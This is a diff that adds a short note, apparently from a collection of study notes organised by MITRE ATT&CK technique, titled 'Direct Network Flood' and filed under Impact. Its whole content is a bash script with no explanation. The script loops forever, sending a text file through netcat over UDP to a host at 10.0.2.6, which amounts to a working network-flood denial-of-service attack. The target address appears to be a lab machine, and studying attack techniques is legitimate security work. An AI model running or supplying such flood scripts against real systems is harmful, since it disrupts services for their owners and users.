@@ -1,0 +1,15 @@
+---
+title: "T1498.001.Direct Network Flood"
+folder: "14. Impact"
+---
+
+
+
+
+
+#!/bin/bash
+
+while true; do
+    cat tekst.txt | nc -q0 -u 10.0.2.6 122
+
+done
